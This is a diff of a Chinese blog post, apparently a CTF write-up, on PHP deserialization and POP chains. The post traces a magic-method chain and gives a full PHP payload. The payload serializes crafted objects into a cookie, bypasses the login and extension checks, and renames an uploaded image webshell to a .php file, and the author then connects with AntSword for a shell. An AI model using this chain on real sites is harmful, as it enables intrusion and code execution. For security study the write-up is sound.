+<p>首先想到的是反序列化，但是反序列化一般都需要源码，所以试了<a href="http://www.zip和www.tar.gz，下载了源码。" target="_blank" rel="noopener">www.zip和www.tar.gz，下载了源码。</a></p>
 </li>
-<li><p>什么是反序列化漏洞：相关人员利用可控的unserilize()输入，经过一系列剖析，构造pop链，从而达到敏感操作目的</p>
+</ul>
 </li>
-<li><p>在使用serialize()函数和unserilize()函数时，那些函数的调用顺序</p>
-</li>
-<li><p>CVE-2016-7124的核心</p>
+</ul>
+<pre><code>全局搜索unserilize函数和serialize函数，发现分别在profile.php和index.php中。
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php   unserialize()  <span class="comment">//对cookie进行反序列化操作 </span></span><br><span class="line">profile.php  serialize()</span><br></pre></td></tr></table></figure>
+
+全局搜索魔法函数
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__desstruct()  Register.php -&gt; <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line">__call()   profile.php -&gt; class profile</span><br><span class="line">__get()    profile.php -&gt; <span class="class"><span class="keyword">class</span> <span class="title">profile</span></span></span><br></pre></td></tr></table></figure>
+
+梳理一下这几个魔法函数在php反序列化中的作用
+
+- __destruct()：调用unserialize()函数时会自动触发这个函数
+- __call()：当被调用的方法不在此类中时，会触发这个函数
+- __get()：当调用的属性不在此类中时，将触发这个方法
+
+分别列举出这几个函数看一下：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Register.php</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+会调用check中的index方法。
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">profile.php    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+结合题目场景，用文件上传一个木马，然后菜刀连接getshell获取flag，但是上传的图片木马不能连接，现在我们的聚焦点在如何利用文件getshell，那就是如何能让我们的木马文件能用，另外梳理一下源代码逻辑，找一下文件操作代码
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">profile.php</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+梳理一下这段代码的作用
+
+- 1.检查是否登录 。**this-&gt;checker=0时则不进入此判断。**
+
+- 2.检查流量包中是否存在$_FILE，存在则会进入ext_check()进行判断，看一下etc_check()的代码
+
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $ext_arr=explode(<span class="string">"."</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ext=end($ext_arr);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">"png"</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+  发现这段代码就是判断文件是否为png文件，我们需要绕过这个判断，由文件上传的知识可以知道，当用GET方式上传文件时，$_FILE这个全局变量是为空的，所以**这里可以用GET访问绕过**
+
+- 如果ext为1，则进行相应的文件操作在后面的构造中，**将ext设为1即可**。
+
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename); <span class="comment">//修改文件名</span></span><br><span class="line">@unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br></pre></td></tr></table></figure>
+
+关键操作在第3点：用copy函数，将filename_tmp的值覆盖原来的文件名，这里就是我们最终想要操作的地方，由前面可知，我们上传的木马被改名且不可用，我们的突破点是**将被改了名的文件改成我们希望的文件名**。所以，终极目标是：**触发profile中的img_upload()方法，且绕过进入文件操作前面的那些判断。**
+
+首先明确这个操作在profile类中
+
+- 第一，我们的序列号字符串中需要一个profile类来通过一些手段来触发这个函数。
+- 第二，如何才能触发这个类中的方法？关注_ _call()、  _ _get() 、_  destruct()这三个函数
+
+首先看__destruct()函数：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Register.php</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+ 会调用checker中的index方法，那么我们怎么才能利用这个函数来触发profile中的upload_img()方法呢？
+
+我们来看一下profile中的魔术方法__call()
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+代码意思为，当所调用的方法不存在时，会进行下面的操作，结合destruct中的代码，如果我们的checker当时序列化的是profile，在destruct的时候，会调用index()方法，但是这个方法在profile中是不存在的，所以触发call方法，到了call方法后，注意这里：$this-&gt;{$this-&gt;$name}()，此时，$name为之前传入的index，这里$this-&gt;$name变为了调用属性。当调用类中不存在的属性名时，会触发__get()方法，看看代码：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+会返回except[$name]的值，注意！我们的终极目标是触发img_upload()函数！这里就是突破点，如果我们把except赋值为：$except[index=&gt;&apos;upload_img&apos;]的话，那get函数返回的值为upload_img，在call函数中，就变成了 $this -&gt; upload_img()，就成功触发了upload_img函数。
+
+#### payload 
+
+结合之前的绕过分析，我们来梳理一下payload。
+
+有个小知识点，需要了解一下PHP的命名空间。https://www.runoob.com/php/php-namespace.html
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span></span><br><span class="line"><span class="class"></span>&#123;	</span><br><span class="line">	<span class="comment">//绕过登录判断</span></span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/1.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/fxxy.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="comment">//绕过文件后缀名判断</span></span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="comment">//触发upload_img()</span></span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+然后用生成的payload替换我们的cookie
+
+![image-20200619160639987](https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619160639987.png)
+
+可以看到文件名已经改了
+
+
+
+![image-20200619162026455](https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619162026455.png)
+
+蚁🗡连接，getshell。
+
+![image-20200619161957182](https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619161957182.png)
+
+## 总结
+
+需要明白下面几点
+
+- 什么是反序列化漏洞：相关人员利用可控的unserilize()输入，经过一系列剖析，构造pop链，从而达到敏感操作目的</code></pre><ul>
+<li><p>在使用serialize()函数和unserilize()函数时，相关魔法函数的调用顺序</p>
+<ul>
+<li>CVE-2016-7124的核心</li>
+</ul>
 </li>
 <li><p>serialize()函数进行序列化时，不同属性序列化的区别</p>
-</li>
-<li><p>什么是pop链，如何构造pop链（先明白简单的）</p>
+<ul>
+<li><p>什么是pop链，如何构造pop链</p>
 <h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://redteam.today/2017/10/01/POP链学习/</a></p>
 <p><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</a></p>
 <p><a href="https://xz.aliyun.com/t/378" target="_blank" rel="noopener">https://xz.aliyun.com/t/378</a></p>
@@ -405,150 +531,48 @@
 </li>
 </ul>
 
-  </div>
-</article>
-
-
+        </div>
 
         
-          <div id="footer-post-container">
-  <div id="footer-post">
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/php/"># php</a>
+                    
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/06/14/JavaScript%E5%AE%9E%E7%8E%B0web%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/">JavaScript实现web浏览器本地存储</a>
+            
+            
+            <a class="next" rel="next" href="/2020/02/14/Windows%E4%B8%8Bvscode%E9%85%8D%E7%BD%AEPHP%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/">Windows下vscode配置PHP动态调试环境</a>
+            
+        </section>
 
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/Search/">Search</a></li>
-         
-          <li><a href="/links/">links</a></li>
-        
-      </ul>
-    </div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#序列化与反序列化"><span class="toc-number">1.</span> <span class="toc-text">序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关函数"><span class="toc-number">2.</span> <span class="toc-text">相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize："><span class="toc-number">2.1.</span> <span class="toc-text">serialize：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">2.1.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize："><span class="toc-number">2.2.</span> <span class="toc-text">unserialize：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#总结-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#魔法函数"><span class="toc-number">3.</span> <span class="toc-text">魔法函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#construct"><span class="toc-number">3.1.</span> <span class="toc-text">__construct():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct"><span class="toc-number">3.2.</span> <span class="toc-text">__destruct():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-number">3.3.</span> <span class="toc-text">__sleep():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup"><span class="toc-number">3.4.</span> <span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-NaN"><span class="toc-number">3.5.</span> <span class="toc-text">__toString()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小实践"><span class="toc-number">4.</span> <span class="toc-text">小实践</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#小题目"><span class="toc-number">4.1.</span> <span class="toc-text">小题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-7124"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2016-7124</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#demo"><span class="toc-number">4.2.1.</span> <span class="toc-text">demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#初识POP链"><span class="toc-number">5.</span> <span class="toc-text">初识POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-1"><span class="toc-number">5.1.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结-2"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#refer"><span class="toc-number">7.</span> <span class="toc-text">refer</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&text=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&is_video=false&description=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PHP反序列化漏洞&body=Check out this article: http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&name=PHP反序列化漏洞&description=&lt;h2 id=&#34;序列化与反序列化&#34;&gt;&lt;a href=&#34;#序列化与反序列化&#34; class=&#34;headerlink&#34; title=&#34;序列化与反序列化&#34;&gt;&lt;/a&gt;序列化与反序列化&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。&lt;/li&gt;
-&lt;li&gt;反序列化：将已经序列化的对象/数组的字符串还原成对象/数组格式。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;​     为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&t=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+    </article>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2020
-    FXXY
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/Search/">Search</a></li>
-         
-          <li><a href="/links/">links</a></li>
-        
-      </ul>
-    </nav>
-  </div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© FXXY | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
 </footer>
 
     </div>
-    <!-- styles -->
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
-
-  
-<script src="/lib/clipboard/clipboard.min.js"></script>
-
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Disqus Comments -->
-
-
 </body>
 </html>
